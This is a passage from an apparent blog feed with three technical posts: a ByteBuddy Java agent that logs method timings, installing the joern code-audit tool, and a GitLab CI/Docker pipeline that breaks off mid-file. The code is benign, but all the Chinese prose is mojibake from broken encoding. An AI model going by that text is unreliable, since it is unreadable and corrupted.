<h2 id="ä½¿ç”¨ByteBuddyæ„å»ºä¸€ä¸ªjava-Agent"><a href="#ä½¿ç”¨ByteBuddyæ„å»ºä¸€ä¸ªjava-Agent" class="headerlink" title="ä½¿ç”¨ByteBuddyæ„å»ºä¸€ä¸ªjava Agent"></a>ä½¿ç”¨ByteBuddyæ„å»ºä¸€ä¸ªjava Agent</h2><p>åªéœ€è¦åŠ ä¾èµ–ç„¶åä¿®æ”¹ä¸€ä¸‹å°±å¥½,æ·»åŠ ä¸¤ä¸ªä¾èµ–,å’Œ<a href="https://lycshub.github.io/2021/11/24/java-ByteBuddy/">ä¹‹å‰æ–‡ç« </a>ä¸€æ ·å…ˆå¯¼å…¥ByteBuddy</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.bytebuddy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>byte-buddy<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.12.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/net.bytebuddy/byte-buddy-agent --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.bytebuddy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>byte-buddy-agent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.12.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="é‡å†™premainæ–¹æ³•"><a href="#é‡å†™premainæ–¹æ³•" class="headerlink" title="é‡å†™premainæ–¹æ³•"></a>é‡å†™<code>premain</code>æ–¹æ³•</h3><p>å®˜æ–¹æ•™ç¨‹ç»™çš„ä½¿ç”¨ByteBuddyåˆ›å»ºä¸€ä¸ªjava Agentçš„æ–¹æ³•</p>
<h4 id="åˆ›å»º-Java-Agents"><a href="#åˆ›å»º-Java-Agents" class="headerlink" title="åˆ›å»º Java Agents"></a>åˆ›å»º Java Agents</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ToStringAgent</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String arguments, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> AgentBuilder.Default()</span><br><span class="line">        .type(isAnnotatedWith(ToString.class))</span><br><span class="line">        .transform(<span class="keyword">new</span> AgentBuilder.Transformer() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> DynamicType.<span class="function">Builder <span class="title">transform</span><span class="params">(DynamicType.Builder builder,</span></span></span><br><span class="line"><span class="params"><span class="function">                                              TypeDescription typeDescription,</span></span></span><br><span class="line"><span class="params"><span class="function">                                              ClassLoader classloader)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> builder.method(named(<span class="string">&quot;toString&quot;</span>))</span><br><span class="line">                      .intercept(FixedValue.value(<span class="string">&quot;transformed&quot;</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;).installOn(instrumentation);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>ç„¶åæ ¹æ®è¿™ä¸ªå½¢å¼å»å†™</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaagent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.agent.builder.AgentBuilder;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.description.method.MethodDescription;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.description.type.TypeDescription;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.dynamic.DynamicType;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.implementation.MethodDelegation;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.matcher.ElementMatchers;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.utility.JavaModule;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAgent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String args, Instrumentation instrumentation)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">//        System.out.println(&quot;Hello javaagent permain:&quot;+args);</span></span><br><span class="line">        System.out.println(<span class="string">&quot;this is an perform monitor agent.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        AgentBuilder.Transformer transformer = <span class="keyword">new</span> AgentBuilder.Transformer() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> DynamicType.Builder&lt;?&gt; transform(DynamicType.Builder&lt;?&gt; builder, TypeDescription typeDescription, ClassLoader classLoader, JavaModule <span class="keyword">module</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> builder</span><br><span class="line">                    .method(ElementMatchers.&lt;MethodDescription&gt;any()) <span class="comment">// æ‹¦æˆªä»»æ„æ–¹æ³•</span></span><br><span class="line">                    .intercept(MethodDelegation.to(TimeInterceptor.class)); <span class="comment">// å§”æ‰˜</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        AgentBuilder.Listener listener = <span class="keyword">new</span> AgentBuilder.Listener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDiscovery</span><span class="params">(String typeName, ClassLoader classLoader, JavaModule <span class="keyword">module</span>, <span class="keyword">boolean</span> loaded)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTransformation</span><span class="params">(TypeDescription typeDescription, ClassLoader classLoader, JavaModule <span class="keyword">module</span>, <span class="keyword">boolean</span> loaded, DynamicType dynamicType)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onIgnored</span><span class="params">(TypeDescription typeDescription, ClassLoader classLoader, JavaModule <span class="keyword">module</span>, <span class="keyword">boolean</span> loaded)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onError</span><span class="params">(String typeName, ClassLoader classLoader, JavaModule <span class="keyword">module</span>, <span class="keyword">boolean</span> loaded, Throwable throwable)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onComplete</span><span class="params">(String typeName, ClassLoader classLoader, JavaModule <span class="keyword">module</span>, <span class="keyword">boolean</span> loaded)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> AgentBuilder</span><br><span class="line">                .Default()</span><br><span class="line">                .type(ElementMatchers.nameStartsWith(<span class="string">&quot;com.javaagent.MyAgentTest&quot;</span>)) <span class="comment">// æŒ‡å®šéœ€è¦æ‹¦æˆªçš„ç±»</span></span><br><span class="line">                .transform(transformer)</span><br><span class="line">                .with(listener)</span><br><span class="line">                .installOn(instrumentation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="å®ç°å§”æ‰˜"><a href="#å®ç°å§”æ‰˜" class="headerlink" title="å®ç°å§”æ‰˜"></a>å®ç°å§”æ‰˜</h3>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaagent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.implementation.bind.annotation.Origin;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.implementation.bind.annotation.RuntimeType;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.implementation.bind.annotation.SuperCall;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Callable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TimeInterceptor</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RuntimeType</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">intercept</span><span class="params">(<span class="meta">@Origin</span> Method method,</span></span></span><br><span class="line"><span class="params"><span class="function">                                   <span class="meta">@SuperCall</span> Callable&lt;?&gt; callable)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> start = System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// åŸæœ‰å‡½æ•°æ‰§è¡Œ</span></span><br><span class="line">            <span class="keyword">return</span> callable.call();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(method + <span class="string">&quot;: took &quot;</span> + (System.currentTimeMillis() - start) + <span class="string">&quot;ms&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="MyAgentTestè¿›è¡Œè°ƒç”¨"><a href="#MyAgentTestè¿›è¡Œè°ƒç”¨" class="headerlink" title="MyAgentTestè¿›è¡Œè°ƒç”¨"></a><code>MyAgentTest</code>è¿›è¡Œè°ƒç”¨</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javaagent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAgentTest</span> </span>&#123;</span><br><span class="line"><span class="comment">//    public static void main(String[] args) &#123;</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;main&quot;);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">fun1</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;this is fun 1.&quot;</span>);</span><br><span class="line">    Thread.sleep(<span class="number">500</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">fun2</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is fun 2.&quot;</span>);</span><br><span class="line">        Thread.sleep(<span class="number">500</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// -javaagent:è¿™é‡Œä¾æ—§æ˜¯åŒ…çš„è·¯å¾„/javaagent-1.0-SNAPSHOT.jar</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        MyAgentTest test = <span class="keyword">new</span> MyAgentTest();</span><br><span class="line">        test.fun1();</span><br><span class="line">        test.fun2();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>â€‹        åŒæ ·å…ˆbuildç„¶ååœ¨è¿›è¡Œè¿è¡Œ</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637819013265-2021-11-2513:43:33.png"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="http://www.jinyunlong.xyz/articles/2021/05/15/1621089190040.html">http://www.jinyunlong.xyz/articles/2021/05/15/1621089190040.html</a></p>
<p><a href="https://www.cnblogs.com/tr1ple/p/12709402.html">https://www.cnblogs.com/tr1ple/p/12709402.html</a></p>
<p><a href="https://github.com/hawkingfoo/demo-agent">https://github.com/hawkingfoo/demo-agent</a></p>
<p><a href="http://rui0.cn/archives/1063">http://rui0.cn/archives/1063</a></p>
<p><a href="http://www.noobyard.com/article/p-smvzgpzs-dh.html">http://www.noobyard.com/article/p-smvzgpzs-dh.html</a></p>
]]></content>
      <categories>
        <category>æ’æ¡©</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>joernä½¿ç”¨(1)</title>
    <url>/2022/12/31/joern%E4%BD%BF%E7%94%A8-1/</url>
    <content><![CDATA[<p>joernæ˜¯ä¸€ä¸ªå¾ˆå¥½ç”¨çš„é™æ€ä»£ç å®¡è®¡å·¥å…·,æœ‰äº›ç±»ä¼¼codeQL,joernçš„æŸ¥è¯¢è¯­å¥å°±æ˜¯scalaè¯­è¨€çš„è¯­æ³•(ä½†å…¶å®ä¸æ¶‰åŠå¤šå°‘scalaè¯­æ³•,joernå°è£…çš„è¿˜è¡Œ,å¯ä»¥ç›´æ¥ä¸Šæ‰‹),åŠ ä¸Šäº†ä¸€ä¸ªcpgå¯¹è±¡,è®©æˆ‘ä»¬å¯ä»¥è®¿é—®cpgå›¾.</p>
<p>cpgå…¨ç§°code property grpah,æ•´åˆäº†<a href="https://docs.joern.io/exporting">AST,CFG,PDG,CDG,DDG</a>äº”ç§æ•°æ®ç»“æ„,ä½¿å…¶å¯ä»¥æ›´åŠ æ–¹ä¾¿ä¾¿åˆ©å’Œè¿›è¡Œæ±¡ç‚¹åˆ†æå¸®åŠ©æ¼æ´çš„æŒ–æ˜.</p>
<p>ä¸codeQLç›¸æ¯”,joernçš„ä¼˜åŠ¿åœ¨äºæ— éœ€ç¼–è¯‘,è€Œåˆ©ç”¨çš„cpgä½¿å…¶æœ‰æ›´å¤šçš„ç»´åº¦å¯ä»¥å¯¹ä»£ç å®¡è®¡.</p>
<span id="more"></span>

<h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><ul>
<li>è¦æ±‚JDK11ä»¥ä¸Š,æœ€å¥½æ˜¯11.</li>
</ul>
<p>å®‰è£…å®˜æ–¹æ–‡æ¡£ç»™äº†ä¸¤ç§æ–¹å¼,ä½†æ˜¯æˆ‘æ¨èç¬¬ä¸‰ç§æ–¹æ³•.</p>
<p>æˆ‘å°è¯•äº†ä¸€ä¸‹é¢„ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–¹æ³•,å‘ç°åœ¨å›½å†…ç½‘ç»œç¯å¢ƒä¸‹,å…¶å®å¹¶ä¸æ˜¯å¾ˆå‹å¥½,å› ä¸ºå®ƒé»˜è®¤æ˜¯ä»githubæ‹‰çš„åŒ…,æ‰€ä»¥å…¶å®å¦‚æœä½ ä¸æŒ‚ä»£ç†,ä½“éªŒä¼šå¾ˆå·®,æˆ‘æ˜¯æŒ‚ç€ç»ˆç«¯ä»£ç†å»å®‰è£…çš„,ä½†å…¶å®æœ‰æ›´å¥½çš„è§£å†³æ–¹æ¡ˆ.</p>
<p>å› ä¸ºä¸Šé¢è¿™ä¸ªé—®é¢˜,æˆ‘ç”¨dockerå°è£…äº†ä¸€ä¸ªé•œåƒ,å°±æœ‰äº†ç¬¬ä¸‰ç§æ–¹æ³•.</p>
<h2 id="1-é¢„ç¼–è¯‘çš„äºŒè¿›åˆ¶"><a href="#1-é¢„ç¼–è¯‘çš„äºŒè¿›åˆ¶" class="headerlink" title="1. é¢„ç¼–è¯‘çš„äºŒè¿›åˆ¶"></a>1. é¢„ç¼–è¯‘çš„äºŒè¿›åˆ¶</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir joern &amp;&amp; cd joern # optional</span><br><span class="line">curl -L &quot;https://github.com/joernio/joern/releases/latest/download/joern-install.sh&quot; -o joern-install.sh</span><br><span class="line">chmod u+x joern-install.sh</span><br><span class="line">./joern-install.sh --interactive</span><br></pre></td></tr></table></figure>

<p>ç„¶åæµ‹è¯•ä½ çš„å®‰è£…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> &lt;path_to_joern&gt;/joern/joern-cli</span><br><span class="line">./joern</span><br><span class="line">Compiling (synthetic)/ammonite/predef/interpBridge.sc</span><br><span class="line">Compiling (synthetic)/ammonite/predef/replBridge.sc</span><br><span class="line">Compiling (synthetic)/ammonite/predef/DefaultPredef.sc</span><br><span class="line">Compiling /home/tmp/shiftleft/joern/(console)</span><br><span class="line"></span><br><span class="line">     â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—</span><br><span class="line">     â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘</span><br><span class="line">     â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘</span><br><span class="line">â–ˆâ–ˆ   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘</span><br><span class="line">â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘</span><br><span class="line"> â•šâ•â•â•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â•â•â•</span><br><span class="line"></span><br><span class="line">joern&gt;</span><br></pre></td></tr></table></figure>



<h2 id="2-ä»æºç æ„å»º"><a href="#2-ä»æºç æ„å»º" class="headerlink" title="2. ä»æºç æ„å»º"></a>2. ä»æºç æ„å»º</h2><p>â€‹    çœç•¥,æœ‰éœ€æ±‚å¯ä»¥çœ‹åº•éƒ¨çš„å®˜ç½‘é“¾æ¥</p>
<h2 id="3-ä½¿ç”¨dockeræ„å»º-æ¨è"><a href="#3-ä½¿ç”¨dockeræ„å»º-æ¨è" class="headerlink" title="3. ä½¿ç”¨dockeræ„å»º(æ¨è)"></a>3. ä½¿ç”¨dockeræ„å»º(<strong>æ¨è</strong>)</h2><p>â€‹    æˆ‘å»æ‰¾äº†ä¸€ä¸‹dockerhub,æ²¡æ‰¾åˆ°å®˜æ–¹ä¸Šä¼ çš„é•œåƒ,ä½†å…¶å®å®˜æ–¹æ˜¯æœ‰ä¸€ä¸ªdockerfileçš„,æˆ‘åæ¥åœ¨å®˜æ–¹çš„ä»“åº“æ‰¾åˆ°äº†,ä½†æ˜¯å®˜æ–¹çš„<a href="https://github.com/joernio/joern/blob/master/Dockerfile">Dockerfile</a>æ„å»ºæ–¹å¼æ˜¯ä»sbtå¯¹scalaæºç è¿›è¡Œæ„å»ºâ€¦</p>
<p>Fine,æˆ‘è¿˜æ˜¯è‡ªå·±æ‰“ä¸€ä¸ªå§.</p>
<p><a href="https://github.com/LycsHub/joern-docker">https://github.com/LycsHub/joern-docker</a></p>
<p>å¯ä»¥ç”¨ä¸Šé¢è¿™ä¸ªä»“åº“ä¸­çš„dockerfile,cloneä»“åº“åcdåˆ°å¯¹åº”è·¯å¾„ä½¿ç”¨<code>build -t joern .</code>æ¥æ„å»ºè¿™ä¸ªé•œåƒ.</p>
<p>é•œåƒå·²ç»æ ¹æ®å›½å†…ç½‘ç»œç‰¹æ®Šæƒ…å†µè¿›è¡Œä¼˜åŒ–,ä½†æ˜¯ä½¿ç”¨ä¹‹å‰è¿˜æ˜¯é˜…è¯»ä¸€ä¸‹README,æˆ‘é»˜è®¤å»é™¤äº†joernè‡ªå¸¦çš„æ‰«æè§„åˆ™åº“,å› ä¸ºä»–ä¹Ÿæ˜¯ä»githubç›´æ¥æ‹‰å–,è¿™éƒ¨åˆ†é€»è¾‘å†™åœ¨æºç ä¸­,ä¸å¤ªå®¹æ˜“è¿›è¡ŒgithubåŠ é€Ÿ.</p>
<p>å¦‚æœè¦ä¸‹è½½å¯ä»¥è¯¦ç»†å‚è€ƒdockerfileä¸­çš„æ³¨é‡Š.</p>
<h2 id="JVMè°ƒèŠ‚æ€§èƒ½"><a href="#JVMè°ƒèŠ‚æ€§èƒ½" class="headerlink" title="JVMè°ƒèŠ‚æ€§èƒ½"></a>JVMè°ƒèŠ‚æ€§èƒ½</h2><p>è¿™é‡Œä»‹ç»çš„æ˜¯å…¨å±€çš„é™åˆ¶,å¯ä»¥åœ¨ä½ çš„shellå¯åŠ¨è„šæœ¬,æ¯”å¦‚<code>~/.bashrc</code>æˆ–è€…<code>~/.zshrc</code>ä¸­æ·»åŠ ä¸€ä¸ªç¯å¢ƒå˜é‡æ¥é™åˆ¶å…¶æœ€å¤§å†…å­˜å ç”¨</p>
<p><code>export _JAVA_OPTS=&quot;-Xmx4G&quot;</code>è¿™æ ·å°±æ˜¯é™åˆ¶4ä¸ªG</p>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://docs.joern.io/installation">https://docs.joern.io/installation</a></p>
]]></content>
      <categories>
        <category>joern</category>
      </categories>
      <tags>
        <tag>é™æ€åˆ†æ</tag>
      </tags>
  </entry>
  <entry>
    <title>gitlab-cié…åˆdockerå®ç°CICD</title>
    <url>/2022/02/20/gitlab-ci%E9%85%8D%E5%90%88docker%E5%AE%9E%E7%8E%B0CICD/</url>
    <content><![CDATA[<h1 id="CI-CD"><a href="#CI-CD" class="headerlink" title="CI/CD"></a>CI/CD</h1><p>ä¹‹å‰ä¸€ç›´ä¸æ˜¯å¾ˆäº†è§£ä»€ä¹ˆæ˜¯CI/CDåªæ˜¯æœ‰ä¸€ä¸ªæ¨¡ç³Šçš„å°è±¡ï¼Œæ¯•ç«Ÿç›´è¯‘å°±æ˜¯æŒç»­é›†æˆ/æŒç»­éƒ¨ç½²,ç„¶åå®é™…ä¸Šæ¥è§¦ä¹‹åå°±å¾ˆæœ‰ä½“ä¼šï¼Œæ‰€è°“çš„cicdç®€å•ç†è§£<strong>å°±æ˜¯ä¸€ç§å¯ä»¥å¸®åŠ©ä½ è‡ªåŠ¨åŒ–æ„å»ºé¡¹ç›®éƒ¨ç½²</strong>çš„è‡ªåŠ¨åŒ–å·¥å…·æµç¨‹ï¼Œæ¯”å¦‚è¯´goé¡¹ç›®åœ¨ç¼–å†™å®Œä»£ç commitä¹‹åï¼Œcicdå°±å¯ä»¥æ ¹æ®ä½ æäº¤çš„æœ€æ–°çš„ä»£ç è¿›è¡ŒbuildæˆäºŒè¿›åˆ¶ï¼Œå¹¶ä¸”é€šè¿‡<strong>æµæ°´çº¿</strong>çš„æ¦‚å¿µå¸®ä½ å®Œæˆä¸€ä¸ªåˆä¸€ä¸ªéƒ¨ç½²æˆ–è€…æ„å»ºé¡¹ç›®ã€‚</p>
<p>æ­£å¥½ç¢°åˆ°äº†ä¸€ä¸ªå®é™…çš„éœ€æ±‚ï¼Œè®°å½•ä¸€ä¸‹åœ¨gitlabä¸‹é…åˆci/cdçš„æµç¨‹ï¼ˆä»¥goé¡¹ç›®ä¸ºä¾‹ï¼‰</p>
<span id="more"></span>

<h1 id="gitlab-runner-docker-CI-CDæµç¨‹"><a href="#gitlab-runner-docker-CI-CDæµç¨‹" class="headerlink" title="gitlab runner+docker CI/CDæµç¨‹"></a>gitlab runner+docker CI/CDæµç¨‹</h1><p>å…¶å®å·¥ç¨‹ä¸Šä¸šåŠ¡éœ€æ±‚ä¸€èˆ¬çš„åˆ†ä¸ºä¸¤ç§ï¼›</p>
<ol>
<li>è‡ªåŠ¨æ„å»ºäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åæ‰“æˆdockeré•œåƒä¸Šä¼ ç§æœ‰dockerä»“åº“</li>
<li>æ‹‰dockerç§æœ‰ä»“åº“å·²ç»å­˜åœ¨çš„é•œåƒï¼Œè¿è¡Œ</li>
</ol>
<p>è¿™ç¯‡æ–‡ç« å†™çš„å¾ˆè¯¦ç»†ï¼Œä¸è¿‡ç”¨çš„æ˜¯æ‰‹åŠ¨ä¸Šä¼ åŒ…åˆ°harborï¼ˆdockerç§æœ‰ä»“åº“çš„å¼€æºå®ç°ï¼‰çš„ã€‚</p>
<ul>
<li><strong>æ‰‹åŠ¨</strong>æ„å»ºdockeråŒ…ä¸Šä¼ harbor ,ä½¿ç”¨gitlab CIä»harboræ‹‰å–é•œåƒ</li>
</ul>
<p><a href="https://blog.k8s.li/gitlab-ci-harbor.html">https://blog.k8s.li/gitlab-ci-harbor.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker login [harbor_host]</span><br><span class="line">docker push dockeré•œåƒè‡³harbor</span><br></pre></td></tr></table></figure>



<p>è€Œåˆšåˆšè¯´çš„ç¬¬ä¸€ç§ä¸šåŠ¡åœºæ™¯æ¨¡æ‹Ÿæ„å»ºå®ç°:</p>
<h2 id="æµæ°´çº¿1-æ„å»ºäºŒè¿›åˆ¶è„šæœ¬-æ‰“åŒ…æˆdockeré•œåƒä¸Šä¼ harbor"><a href="#æµæ°´çº¿1-æ„å»ºäºŒè¿›åˆ¶è„šæœ¬-æ‰“åŒ…æˆdockeré•œåƒä¸Šä¼ harbor" class="headerlink" title="æµæ°´çº¿1:æ„å»ºäºŒè¿›åˆ¶è„šæœ¬-æ‰“åŒ…æˆdockeré•œåƒä¸Šä¼ harbor"></a>æµæ°´çº¿1:æ„å»ºäºŒè¿›åˆ¶è„šæœ¬-æ‰“åŒ…æˆdockeré•œåƒä¸Šä¼ harbor</h2><p><code>.gitlab-ci.yml</code></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æ„å»ºgolangçš„åŒ…å¹¶ä¸”åšæˆdockeré•œåƒä¸Šä¼ è‡³harborç§åº“</span></span><br><span class="line"><span class="attr">stages:</span>          </span><br><span class="line">  <span class="bullet">-</span> <span class="string">build</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">docker</span></span><br><span class="line"></span><br><span class="line"><span class="attr">build:</span>       </span><br><span class="line">  <span class="attr">stage:</span> <span class="string">build</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">golang:alpine</span></span><br><span class="line">  <span class="attr">before_script:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">go</span> <span class="string">env</span> <span class="string">-w</span> <span class="string">GO111MODULE=on</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">go</span> <span class="string">env</span> <span class="string">-w</span> <span class="string">GOPROXY=https://goproxy.cn</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">  <span class="comment"># go build -o binaryFile sourcecCodeFile</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">go</span> <span class="string">build</span> <span class="string">-o</span> <span class="string">build/helloworld</span> <span class="string">main.go</span></span><br><span class="line">  <span class="attr">tags:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">dev</span></span><br><span class="line"></span><br><span class="line"><span class="attr">docker:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">docker</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">docker:latest</span></span><br><span class="line">  <span class="attr">variables:</span></span><br><span 